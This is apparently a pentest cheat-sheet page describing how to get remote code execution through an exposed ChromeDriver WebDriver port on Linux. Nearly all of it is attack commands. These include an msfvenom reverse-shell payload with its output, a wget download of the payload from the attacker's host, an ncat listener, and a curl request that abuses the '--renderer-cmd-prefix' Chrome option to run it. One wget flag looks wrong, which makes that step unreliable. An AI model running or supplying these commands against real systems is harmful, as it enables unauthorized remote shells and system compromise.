---
title: "WebDriver"
date: 2025-8-1
tags: ["WebDriver", "ChromeDriver", "Privilege Escalation", "Chrome", "Selenium", "API"]
---

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

### Privesc #1: RCE

#### 1. Create a Payload

```console
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f elf > rev 
```

```console {class="sample-code"}
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=1337 -f elf > rev    
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

#### 2. Upload to Target

```console
wget http://<LOCAL_IP>/rev -o /tmp/rev
```

```console
# Chmod
chmod 755 /tmp/rev
```

#### 3. Start a Listener

```console
rlwrap ncat -lvnp <LOCAL_PORT>
```

#### 3. Create a Sesson with Command

```console
curl -d '{
    "capabilities": {
        "alwaysMatch": {
            "browserName": "chrome",
            "goog:chromeOptions": {
                "args": ["--headless", "--no-sandbox", "--disable-dev-shm-usage", "--renderer-cmd-prefix=/tmp/rev"],
                "prefs": {
                }
            }
        }
    }
}' http://<TARGET>:9515/session
```

{{< /tabcontent >}}